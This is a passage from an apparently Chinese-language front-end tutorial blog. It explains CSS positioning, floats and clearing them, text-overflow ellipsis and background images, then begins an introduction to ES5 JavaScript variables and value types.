class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>现在我们给content加上绝对定位的样式。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.content</span>&#123;</span></span><br><span class="line">    position: absolute;</span><br><span class="line">    left: 50px;</span><br><span class="line">    width: 50px;</span><br><span class="line">    height: 50px;</span><br><span class="line">    background-color: yellow;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这个时候content那个黄色的小方块会跑到橘黄色的方块外面。</p>
<p>这是因为，当我们给content设置position:absolute，由于没有父级元素有定位，所以content会相对于浏览器边框定位，这时content的left属性就是相对于浏览器边框左边有50px的意思。</p>
<p>如果我们把content的定位换成relative，content黄色小方块在黑色方块的左上角，然后relative相对于自身的位置进行定位，这个时候left属性的意思就是相对于本来在黑色左上角的那个位置向右移动了50px。</p>
<p>因此，总结一下absolute和relative的特点：</p>
<p>absolute：</p>
<p>1.脱离原来位置进行定位</p>
<p>2.相对于最近的有定位的父级进行定位，如果没有那么相对于浏览器边框定位。</p>
<p>relative：</p>
<p>1.保留原来位置定位</p>
<p>2.相对于自己原来位置进行定位，一般被用来设置参照物</p>
<p>4.fixed</p>
<p>fixed定位是相对于视口定位，我们在网页上都见过左右两边不随着鼠标滚轮滚动而改变位置的广告栏，就是用fixed定位的。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.fixed</span> &#123;</span></span><br><span class="line">    position: fixed;</span><br><span class="line">    right: 0px;</span><br><span class="line">    top: 200px;</span><br><span class="line">    height: 200px;</span><br><span class="line">    width: 50px;</span><br><span class="line">    background-color: red;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fixed"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>.fixed这个元素会一直在视口的右边，不随着滚轮滚动而改变相对于视口的位置。</p>
<p>学习了定位之后，我们就可以实现元素水平垂直居中的效果了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  div &#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 100px;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left: 50%;</span><br><span class="line">    top: 50%;</span><br><span class="line">    margin-left: -50px;</span><br><span class="line">    margin-top: -50px;</span><br><span class="line">    background-color: red;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个div就会在有定位的父级里面水平垂直居中哦。</p>
<p>我们还可以实现多栏布局。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  * &#123;</span><br><span class="line">    margin: 0px;</span><br><span class="line">    padding: 0px;</span><br><span class="line">  &#125;</span><br><span class="line">  div &#123;</span><br><span class="line">    height: 100px;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.left</span> &#123;      </span></span><br><span class="line">    position: absolute;</span><br><span class="line">    left: 0;</span><br><span class="line">    width: 100px;</span><br><span class="line">    background-color: yellow;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.right</span> &#123;</span></span><br><span class="line">    position: absolute;</span><br><span class="line">    right: 0;</span><br><span class="line">    width: 100px;</span><br><span class="line">    background-color: green;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.mid</span> &#123;</span></span><br><span class="line">    margin-left: 100px;</span><br><span class="line">    margin-right: 100px;</span><br><span class="line">    background-color: red;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mid"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我们首先固定左侧和右侧的两个div，然后让中间的div分别给左侧和右侧留出一个固定宽度的margin之后，让自身自适应屏幕的大小即可实现三栏布局效果。</p>
<h2 id="浮动模型"><a href="#浮动模型" class="headerlink" title="浮动模型"></a>浮动模型</h2><h3 id="浮动模型-1"><a href="#浮动模型-1" class="headerlink" title="浮动模型"></a>浮动模型</h3><p>我们首先写一个二级结构：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.wrapper</span> &#123;     </span></span><br><span class="line"><span class="css">    <span class="selector-tag">width</span><span class="selector-pseudo">:400px</span>;      </span></span><br><span class="line">    height: 100px;      </span><br><span class="line">    border: 1px solid red;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.content</span> &#123;      </span></span><br><span class="line">    width: 100px;      </span><br><span class="line">    height: 100px;</span><br><span class="line">    background-color: black;</span><br><span class="line">    color: white;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>现在我们给content加上一个特殊的属性：float<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.content</span> &#123;      </span></span><br><span class="line">    width: 100px;      </span><br><span class="line">    height: 100px;</span><br><span class="line">    float: left;</span><br><span class="line">    background-color: black;</span><br><span class="line">    color: white;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>.content元素就会像站队列一样排列了，这就是float属性的效果哦。</p>
<p>下面来正式介绍一下float属性</p>
<p>float属性可以让元素像站队列一样浮动起来，它会让本来占满整行的元素只按照内容和设置的大小在父级里面进行站队排列，当这一行剩余的空间不足以再放下一个元素的时候，元素就会自动换行，到下一行去进行浮动排列。当容器不够大的时候，虽然内容会超出容器的范围，但是超出之后仍然会按照相同的队形来进行站队。</p>
<p>浮动元素会像absolute的元素一样脱离文档流，但不会脱离文字流，这是什么意思呢？</p>
<p>我们来举一个例子：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.top</span> &#123;      </span></span><br><span class="line">    width: 100px;      </span><br><span class="line">    height: 100px;      </span><br><span class="line">    background-color: red;      </span><br><span class="line">    float: left;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.bottom</span> &#123;      </span></span><br><span class="line">    width: 200px;      </span><br><span class="line">    height: 200px;</span><br><span class="line">    background-color: black;</span><br><span class="line">    color: white;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bottom"</span>&gt;</span>我是文字，我能看到文字流哟~<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>脱离文档流的意思就是正常的元素看不到它了，这一点很类似absolute属性，不脱离文字流的意思则是display属性是inline或者inline-block的元素还是可以看到它的，文字本身是inline属性的。</p>
<p>接下来，我们讲.bottom这个div的display改成inline-block，再看一下效果。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.bottom</span> &#123;      </span></span><br><span class="line">    width: 200px;      </span><br><span class="line">    height: 200px;</span><br><span class="line">    background-color: black;</span><br><span class="line">    color: white;</span><br><span class="line">    display: inline-block;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我们发现下面的黑色方块并没有移动到下一行，而是紧跟着红色浮动方块进行了排列，但是我们并没有给黑色方块设置浮动效果啊？</p>
<p>这是因为，float属性会自动将这个元素的display给改成inline-block，也就是说，只要有float属性，那么这个元素的display就是inline-block，这就是为什么红色浮动方块没有独占一行的原因了。</p>
<p>float属性只有两个值：left和right，默认的状态是none。</p>
<p>right的效果就是从右边开始排列，left则相反。</p>
<p>下面我们来总结一下float属性</p>
<p>1.可以像absolute一样，让元素浮动起来，产生自己独有的浮动流。</p>
<p>2.脱离标准的文档流，但不会脱离文字流，正常的元素看不到它，但是有文字属性inline或inline-block的元素可以看到它。</p>
<p>3.在内部把改元素变成display: inline-block。</p>
<p>开发中，一般进行网状布局时可以使用float属性。当我们不知道容器里面会盛放多少个子元素，但是这些子元素又是按照一样的格式进行排列的，我们可以设置浮动来进行流式布局。浮动属性还可以让我们实现像报纸那样文字包围在图片四周的效果。</p>
<p>那么如何清除浮动流呢？</p>
<p>我们说了，元素浮动起来之后，正常的元素就看不到它了，包裹它的父级自然也看不到它了，我们想让父级根据里面浮动的子元素来自适应宽高，如果不清除浮动的话，父级就只剩下一条线了！</p>
<p>那么怎么来清除浮动呢？</p>
<p>1.我们先来一个不规范的写法解释下原理，我们在父级里面的内容区最后加一个p标签。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"clear"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们给这个p标签增加清除浮动的样式：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.clear</span> &#123;</span></span><br><span class="line"><span class="css">    <span class="comment">/* clear属性专门用来清除浮动的，虽然有还有left和right值，但是我们清除浮动一般都写both值。 */</span></span></span><br><span class="line">    clear: both;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这时，父级的wrapper已经正常包裹住子元素了。</p>
<p>但实际上，并不是父级清除了浮动流，而是被p撑开了，p.clear标签能看到上面浮动的元素，wrapper能看到不浮动的p标签，因此就把p标签包裹进去了，仅此而已。</p>
<p>我们要知道html中的标签是做结构规划的，这个p标签只是清除浮动的功能，不具备p标签的段落语义，这种代码在html里是不规范的，因此不适用。</p>
<p>所以我们采用添加伪元素的方法</p>
<p>我们首先介绍一下伪元素。</p>
<p>伪元素是一种不能单独存在的元素，它必须要依附于其他元素标签使用，伪元素常用的一共有两个：after和before。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  span &#123;</span><br><span class="line">    background-color: yellow;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-tag">span</span><span class="selector-pseudo">::before</span> &#123;</span></span><br><span class="line">    content: '前';</span><br><span class="line">    background-color: red;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-tag">span</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line">    content:'后';</span><br><span class="line">    background-color: black;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当我们不想改变html结构，又想增添一些东西的时候，伪元素after和before就非常实用。</p>
<p>要注意的是，写伪元素，即使内容是空的，也要加上content这个属性content:””。</p>
<p>既然是伪元素，那么自然也属于元素了，我们可以改变伪元素的display为block，从而可以改变宽高等块级元素才有的样式。</p>
<p>了解伪元素之后，我们根据第一种方式，为父级元素添加一个after伪元素，让这个伪元素专门实现清除浮动的功能：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.wrapper</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line">    content: '';</span><br><span class="line">    clear: both;</span><br><span class="line">    display: block;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这就是我们通常使用的清除浮动的方法。</p>
<p>然而在ie6、ie7并没有伪元素这种东西，怎么办？</p>
<p>前面我们介绍了bfc，这里我们介绍ie6、ie7独有的一个东西——hasLayout。只要触发了hasLayout就和触发bfc有差不多的作用，我们可以用zoom属性来触发它。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="comment">/* 视口同比例放大还是缩小，1就是不变 */</span></span><br><span class="line">  <span class="attribute">zoom</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当我们写上这个元素的时候，ie6、ie7也可以清除浮动了。</p>
<p>不过我们其他的浏览器并不需要zoom这个属性，这个属性只是为了ie6和ie7准备的，这个时候我们需要一点点css hack，我们在zoom前面加一个<em>号， </em>zoom: 1; 这个符号只有ie6和ie7能够识别，其他的浏览器都不识别，这样就可以让ie6和ie7去读这一行属性，其他浏览器直接忽略。顺便一提属性前面加上”_”之后，就只有ie6可以识别了（_zoom: 1）。</p>
<p>另外我们还可以触发bfc来清除浮动</p>
<p>有很多属性都可以触发bfc：</p>
<p>① 给.wrapper添加overflow:hidden; 可以让父级包裹住浮动子元素。</p>
<p>② 给.wrapper添加display: inline-block; 可以让父级彻底包裹住浮动子元素。</p>
<p>③ 给.wrapper添加position:absolute; 可以让父级彻底包裹住浮动子元素。</p>
<p>虽然这三种方式都可以清除浮动，但都会改变样式，不符合开发规范，因此我们基本不使用。</p>
<p>我们学习了浮动模型之后，也可以用这种方式来实现三栏布局哦<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.left</span> &#123;</span></span><br><span class="line">    width: 50px;</span><br><span class="line">    height: 50px;</span><br><span class="line">    background-color: red;</span><br><span class="line">    float: left;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.right</span> &#123;</span></span><br><span class="line">    width: 50px;</span><br><span class="line">    height: 50px;</span><br><span class="line">    background-color: yellow;</span><br><span class="line">    float: right;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.mid</span> &#123;</span></span><br><span class="line">    margin-left: 50px;</span><br><span class="line">    margin-right: 50px;</span><br><span class="line">    height: 50px;</span><br><span class="line">    background-color: green;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mid"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="css背景图片和其它"><a href="#css背景图片和其它" class="headerlink" title="css背景图片和其它"></a>css背景图片和其它</h2><h3 id="单行文字溢出打点"><a href="#单行文字溢出打点" class="headerlink" title="单行文字溢出打点"></a>单行文字溢出打点</h3><p>溢出打点是指当文字超过我们所规定的范围，后面的文字就以”…”的形式表现。</p>
<p>它由三个属性组合来完成：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  div &#123;</span><br><span class="line">    width: 300px;</span><br><span class="line">    height: 20px;</span><br><span class="line">    background-color: red;</span><br><span class="line"></span><br><span class="line">    overflow: hidden;</span><br><span class="line">    white-space: nowrap;</span><br><span class="line">    text-overflow: ellipsis;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  单行文字溢出测试单行文字溢出测试单行文字溢出测试单行文字溢出测试单行文字溢出测试单行文字溢出测试单行文字溢出测试单行文字溢出测试</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我们可以看到文字溢出打点了。</p>
<p>现在我们来介绍这三个属性</p>
<p>1.overflow: hidden; 让文字溢出容器的部分隐藏起来。</p>
<p>2.white-space: nowrap; 让文字不换行。文字默认是换行的。</p>
<p>3.text-overflow: ellipsis; 文字溢出之后，怎么处理。这里的处理方式是以点状显示。</p>
<p>这样三条属性配合使用，就可以实现单行文字溢出打点的功能了。</p>
<h3 id="多行文字溢出打点"><a href="#多行文字溢出打点" class="headerlink" title="多行文字溢出打点"></a>多行文字溢出打点</h3><p>多行文字溢出打点的css兼容性不是很好，需要较高版本浏览器的支持，所以有的是通过计算文字宽高，然后手写”…”实现的。</p>
<p>如果我们想要以属性的方式实现，可以这么写：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  div &#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    text-overflow: ellipsis;</span><br><span class="line">    display: -webkit-box;</span><br><span class="line">    -webkit-line-clamp: 3;</span><br><span class="line">    -webkit-box-orient: vertical;</span><br><span class="line">    background-color: red;</span><br><span class="line">    color: black;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里的-webkit-前缀的意思是webkit内核的浏览器私有属性。</p>
<h3 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h3><p>我们知道<code>&lt;img&gt;</code>标签可以展示图片，但是如果我们想要在图片上面写字的话，这个标签就不太好用了，这个时候就需要用到一个叫作background-image（背景图片）的属性了。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">background-image</span>: <span class="selector-tag">url</span>();</span><br></pre></td></tr></table></figure>
<p>url里面放图片地址，这样我们就可以给一个元素设置背景图片了，然后元素里面正常写文字就可以了。</p>
<p>还有一些其他的属性专门用来修饰背景图片样式的：</p>
<p>background-size</p>
<p>设置背景图片大小。</p>
<p>它有很多值：</p>
<p>1.cover（覆盖）</p>
<p>可以让浏览器用一张图片尽可能填充满我们的容器，当图片大的时候会截掉多余部分。</p>
<p>它的填充机制是：先等比例放大(或缩小)图片至宽度或高度等于元素的宽或高，看哪种方式可以让一张图片填充满整个元素，再裁减掉多余的部分。</p>
<p>2.contain（包含）</p>
<p>尽可能展示图片的全部信息，如果有剩余空间，就填充相同的图片。</p>
<p>它的填充机制是：固定一条边之后，让另外一条边可以全部显示，有剩余的部分就填充相同的图片。</p>
<p>3.设置x y 像素值</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">background-size</span>: 50<span class="selector-tag">px</span> 50<span class="selector-tag">px</span>;</span><br></pre></td></tr></table></figure>
<p>这样会让浏览器强行把图片展示成50*50的大小。</p>
<p>4.百分数</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">background-size</span>: 50% 50%;</span><br></pre></td></tr></table></figure>
<p>会让图片占容器宽高的50%，子级元素的百分比相对数值是父级里面这个属性的值，比如父级的高度是100px，那么子级的50%就是50px。</p>
<p>background-repeat</p>
<p>设置背景图片是否可以重复显示，默认是重复的repeat。也就说默认状态下，容器空余很多的时候，就会有相同的图片来填充容器剩余的空间。</p>
<p>而值为no-repeat时，不论容器剩余多少空间，都不会进行图片复制填充。</p>
<p>background-position</p>
<p>设置背景图片开始的位置，它的值同样有很多种：</p>
<p>1.像素</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">background-position</span>: 50<span class="selector-tag">px</span> 50<span class="selector-tag">px</span>;</span><br></pre></td></tr></table></figure>
<p>这样背景图片就会从容器的x轴50px y轴50px的位置开始显示。</p>
<p>2.百分比</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.background-position</span>: 50% 50%;</span><br></pre></td></tr></table></figure>
<p>当写50% 50%的时候，图片刚好会在容器的正中央显示。</p>
<p>》》》》》》》》</p>
<h1 id="js-ECMAScript-5"><a href="#js-ECMAScript-5" class="headerlink" title="js(ECMAScript 5)"></a>js(ECMAScript 5)</h1><h2 id="初识JavaScript"><a href="#初识JavaScript" class="headerlink" title="初识JavaScript"></a>初识JavaScript</h2><p>JavaScript作为Netscape Navigator浏览器的一部分首次出现在1996年，它最初的设计目的是为了改善网页的用户体验。</p>
<p>ECMA为了统一js，推出了ECMA标准，因此js语言也可以被称为ECMAScript。本章我们介绍的是ECMAScript 5的知识，es6会在后面章节介绍。</p>
<p>js有两个特点</p>
<ol>
<li><p>解释性语言，不需要代码编译，可以跨平台。</p>
</li>
<li><p>单线程</p>
</li>
</ol>
<p>在浏览器中，js有三大部分：ECMAScript、DOM、BOM。</p>
<ol>
<li><p>ECMAScript：符合ECMA标准的javascript语言。</p>
</li>
<li><p>DOM：文档对象模型（Document Object Model），可以操作网页。</p>
</li>
<li><p>BOM：浏览器对象模型（Browser Object Model），可以操作浏览器。</p>
</li>
</ol>
<h2 id="引入JavaScript"><a href="#引入JavaScript" class="headerlink" title="引入JavaScript"></a>引入JavaScript</h2><p>在网页中引入JavaScript有两种方法。</p>
<p>1.页面内嵌script标签</p>
<p>我们可以在<code>&lt;head&gt;&lt;/head&gt;</code>标签或者<code>&lt;body&gt;&lt;/body&gt;</code>标签里面写一个<code>&lt;script&gt;&lt;/script&gt;</code>标签，这个标签有一个type属性，我们赋值为”text/javascript”，也可以不写type属性，浏览器默认就是这个。</p>
<p>写完标签后，我们就可以在这个标签里写js代码了。</p>
<p>2.引入外部js文件</p>
<p>script标签有个src属性可以引入外部js文件。</p>
<p>一个script标签只能在里面写代码或者引入外部js文件，不能既引入又在里面写代码。</p>
<p>我们一般采用第二种引入外部js文件的方法，结构(html)、样式(css)、行为(js)相分离，方便维护。</p>
<p>浏览器在加载html文件的时候，当遇到link标签会异步加载，但遇到script标签，会阻塞后面内容的加载，直到js文件下载并执行完毕。</p>
<p>这样就会导致两个问题</p>
<p>1.如果js操作DOM的话，页面的DOM还没有解析，js操作DOM就会出错。</p>
<p>2.如果js文件较大、执行较慢，会导致页面一直没有内容出现。</p>
<p>所以，我们一般会把script标签写在body标签中最后一行。 </p>
<h2 id="JavaScript基本语法"><a href="#JavaScript基本语法" class="headerlink" title="JavaScript基本语法"></a>JavaScript基本语法</h2><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>js是弱数据类型语言，任何类型的变量都可以用关键字var来声明</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span>  arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"abc"</span>;</span><br></pre></td></tr></table></figure>
<p>也可以先声明，再赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num;</span><br><span class="line">num = <span class="number">123</span>;</span><br></pre></td></tr></table></figure>
<p>当我们要声明多个变量的时候，一般采用下面这种写法节省代码量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num1 = <span class="number">123</span>,</span><br><span class="line">    num1= <span class="number">123</span>,</span><br><span class="line">    num2 = <span class="number">123</span>;</span><br></pre></td></tr></table></figure>
<h3 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h3><p>1.以英文字母、_、$符号开头。</p>
<p>2.变量名可以包括数字。</p>
<p>3.不可以使用关键字、保留字作为变量名。</p>
<p>关键字是被系统定义了语法的单词，如var、window、if、else等。</p>
<p>保留字是以后可能会变成关键字而做的保留词，如enum、abstract等。</p>
<h3 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h3><p>js数据的值主要分为两大类：</p>
<p>1.原始值</p>
<p>Number、String、Boolean、undefined、null</p>
<p>undefined是未定义的意思，null是空值的意思。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="literal">null</span>;</span><br><span class="line"><span class="built_in">console</span>.log(demo); <span class="comment">//null</span></span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>
<p>2.引用值</p>
<p>主要有：数组array、对象object、函数function</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">  name: <span class="string">"demo"</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// 1,2,3,4</span></span><br><span class="line"><span class="built_in">console</span>.log(object);<span class="comment">// [Object Object]</span></span><br><span class="line"><span class="built_in">console</span>.log(object.name);<span class="comment">// demo</span></span><br></pre></td></tr></table></figure>
<p>这两种数据类型的区别在哪里呢？</p>
<p>举一个例子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">123</span>,</span><br><span class="line">    num1 = num;</span><br><span class="line">num = <span class="number">234</span>;</span><br><span class="line"><span class="built_in">console</span>.log(num);<span class="comment">// 234</span></span><br><span class="line"><span class="built_in">console</span>.log(num1);<span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// num的改变对num1完全没有影响。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    arr1 = arr;</span><br><span class="line">arr.push(<span class="number">4</span>);</span><br><span class="line">arr.push(<span class="number">5</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// 1,2,3,4,5</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1);<span class="comment">// 1,2,3,4,5</span></span><br></pre></td></tr></table></figure></p>
<p>我们发现我们只是改变了arr的值，但是arr1也跟着改变了，这就是两种数据类型的第一个区别。</p>
